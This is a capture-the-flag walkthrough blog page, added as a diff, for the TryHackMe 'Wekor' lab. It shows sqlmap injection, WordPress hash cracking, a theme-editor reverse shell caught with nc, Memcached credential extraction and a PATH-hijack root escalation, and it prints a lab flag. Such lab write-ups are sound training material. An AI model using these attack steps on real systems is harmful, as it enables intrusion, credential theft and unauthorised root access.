@@ -1,0 +1,300 @@
+
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Wekor | tudor.mindra</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Wekor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="THM - Wekor" />
+<meta property="og:description" content="THM - Wekor" />
+<link rel="canonical" href="https://tudm99.github.io/wekor.html" />
+<meta property="og:url" content="https://tudm99.github.io/wekor.html" />
+<meta property="og:site_name" content="tudor.mindra" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Wekor" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"THM - Wekor","headline":"Wekor","url":"https://tudm99.github.io/wekor.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9d81aa5ec0fd3d378905a6f5c775505f2ede6d9d">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Wekor</h1>
+      <h2 class="project-tagline">THM - Wekor</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h2 id="enumeration">Enumeration</h2>
+
+<p>First of all, we need to add “wekor.thm” to our “/etc/hosts”</p>
+
+<p>Nmap Scan:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for wekor.thm (10.10.174.31)
+Host is up (0.066s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p>Subdomain Enumeration:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000382:   200        5 L      29 W       143 Ch      "site"
+</code></pre></div></div>
+<p>We’ve found a subdomain, “site.wekor.thm”.
+Let’s keep it in mind for later.</p>
+
+<p>Robots.txt:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-agent: *
+Disallow: /workshop/
+Disallow: /root/
+Disallow: /lol/
+Disallow: /agent/
+Disallow: /feed
+Disallow: /crawler
+Disallow: /boot
+Disallow: /comingreallysoon
+Disallow: /interesting
+</code></pre></div></div>
+<p>Navigating to /comingreallysoon, we are greeted by this message:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! 
+</code></pre></div></div>
+
+<p>Gobuster on /it-next:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/images
+/css
+/js
+</code></pre></div></div>
+<p>From what we can see, this is an e-commerce website. (more or less)</p>
+
+<p>And a common vulnerability for this kind of website is an SQL injection.</p>
+
+<p>We just need to find a field that makes sense.</p>
+
+<p>When looking for this kind of vulnerability, think about it in terms of tables, veryfing information, and storage.</p>
+
+<p>Items are stored, but we don’t have any input field for the product id.</p>
+
+<p>Next on our list, is the coupon code field on the cart page.</p>
+
+<p><img src="https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/wekor_01.png" alt="cart" /></p>
+
+<p>Let’s apply a “test” coupon, and send that request to sqlmap.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -r cart_req.req --dump-all --batch --level 5 --risk 3 
+</code></pre></div></div>
+<p>Now, once you do that, the output will be MASSIVE.</p>
+
+<p>I won’t let you sort it on your own, the info we need is in the “wordpress” folder.</p>
+
+<p><img src="https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/wekor_02.png" alt="wp_folder" /></p>
+
+<p>Open and inspect the “wp_users.csv” file.</p>
+
+<p><img src="https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/wekor_03.png" alt="wp_users" /></p>
+
+<p>We found a list of users and password hashes.</p>
+
+<p>Let’s save the hashes and crack them using hashcat.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 400 hashwordpress /usr/share/wordlists/rockyou.txt --show
+3 out of 4
+</code></pre></div></div>
+<p>We found 3 passwords. Let’s attempt to login using them.</p>
+
+<p>BUT</p>
+
+<p>Before we do that, we need to find a wordpress site. Remember that “site.wekor.thm” subdomain we found?</p>
+
+<p>Let’s add it to our “/etc/hosts”, and enumerate it.</p>
+
+<p>Gobuster on site.wekor.thm</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/wordpress
+/wordpress/wp-content
+/wordpress/wp-includes
+/wordpress/wp-admin
+</code></pre></div></div>
+<p>Now i’ll try the 3 users we have credentials for, and most likely we’ll have a theme editor shell in no time.</p>
+
+<p>Aaand, we have dashboard access!</p>
+
+<p><img src="https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/wekor_04.png" alt="dashboard" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Let’s get the theme editor running, and replace the 404.php content with a php shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 9002
+Listening on 0.0.0.0 9002
+Connection received on 10.10.174.31 46588
+SOCKET: Shell has connected! PID: 2078
+whoami
+www-data
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+&lt;r.thm/wordpress/wp-content/themes/twentyseventeen$
+</code></pre></div></div>
+<p>By reading the passwd file, we identified another user, Orka.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Orka:x:1001:1001::/home/Orka:/bin/bash
+</code></pre></div></div>
+<p>Let’s get linpeas and look for lateral privilege escalation.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN
+</code></pre></div></div>
+<p>We see a service running on port 11211. A quick google search brings up Memcached caching system.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Another search into memcached brings up a telnet connection. So we can run telnet directly from the compromised server.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;r.thm/wordpress/wp-content/themes/twentyseventeen$ telnet 127.0.0.1 11211
+telnet 127.0.0.1 11211
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+
+stats items ## COMMAND 1 - We notice there's only one id. (id 1)
+
+STAT items:1:number 5
+STAT items:1:age 2999
+STAT items:1:evicted 0
+STAT items:1:evicted_nonzero 0
+STAT items:1:evicted_time 0
+STAT items:1:outofmemory 0
+STAT items:1:tailrepairs 0
+STAT items:1:reclaimed 0
+STAT items:1:expired_unfetched 0
+STAT items:1:evicted_unfetched 0
+STAT items:1:crawler_reclaimed 0
+STAT items:1:crawler_items_checked 0
+STAT items:1:lrutail_reflocked 0
+
+stats cachedump 1 0 ## COMMAND 2 - Display everything in id(1)
+get user            ## COMMAND 3
+get password        ## COMMAND 4
+VALUE password 0 15
+OrkAi[REDACTED]
+</code></pre></div></div>
+<p>Nice, we now have Orka’s password. Let’s try to switch users.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@osboxes:/var/www$ su Orka
+su Orka
+Password: OrkA[REDACTED]
+Orka@osboxes:/var/www$ 
+Orka@osboxes:/var/www$ cd ~
+cd ~
+Orka@osboxes:~$ ls
+ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+Orka@osboxes:~$ cat user.txt
+cat user.txt
+1a26a6d51c0172400add0e297608dec6
+Orka@osboxes:~$ 
+</code></pre></div></div>
+<p>Great! We now have the user flag.</p>
+
+<p>Let’s look for another privilege escalation vector. Try the usual: sudo -l; SUID binaries; PATH manipulation; etc.</p>
+
+<p>I’ll use linpeas again, just for commodity’s sake.</p>
+
+<p>Linpeas spitted this out:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] PATH
+[i] Any writable folder in original PATH? (a new completed path will be exported)                                                
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                     
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</code></pre></div></div>
+<p>This means we can write to “/usr/sbin”</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Orka@osboxes:~$ sudo -l
+sudo -l
+Matching Defaults entries for Orka on osboxes:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User Orka may run the following commands on osboxes:
+    (root) /home/Orka/Desktop/bitcoin
+</code></pre></div></div>
+<p>“sudo -l” returned “/home/Orka/Desktop/bitcoin”</p>
+
+<p>Running “strings” on the bitcoin file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>t$,U
+[^_]
+Enter the password : 
+password
+Access Denied... 
+Access Granted...
+</code></pre></div></div>
+<p>The password to run the file, is “password”.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Orka@osboxes:~/Desktop$ which python
+which python
+/usr/bin/python
+</code></pre></div></div>
+
+<p>Our writable path, /usr/sbin/, has a higher precedence in this case than the python default of /usr/bin/.</p>
+
+<p>We can use this to our advantage and escalate our privileges.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Orka@osboxes:~/Desktop$ cat &gt; /usr/sbin/python &lt;&lt; EOF
+cat &gt; /usr/sbin/python &lt;&lt; EOF
+&gt; #!/bin/bash
+#!/bin/bash
+&gt; /bin/bash
+/bin/bash
+&gt; EOF
+EOF
+Orka@osboxes:~/Desktop$ chmod +x /usr/sbin/python
+chmod +x /usr/sbin/python
+Orka@osboxes:~/Desktop$ sudo /home/Orka/Desktop/bitcoin
+sudo /home/Orka/Desktop/bitcoin
+Enter the password : password
+password
+Access Granted...
+                        User Manual:
+Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
+Amounts with more than one number will be stripped off! 
+And Lastly, be careful, everything is logged :) 
+Amount Of BitCoins : 12
+12
+root@osboxes:~/Desktop# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@osboxes:~/Desktop# 
+</code></pre></div></div>
+<p>We now have root access to the machine. Read the flag and submit it!</p>
+
+<p>Good hunting o7</p>
+
+<p><a href="https://tryhackme.com/room/wekorra">Try it out yourself!</a></p>
+
+<script src="https://platform.linkedin.com/in.js" type="text/javascript">lang: en_US</script>
+<script type="IN/Share" data-url="https://www.linkedin.com"></script>
+
+<p><a href="./">back</a></p>
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
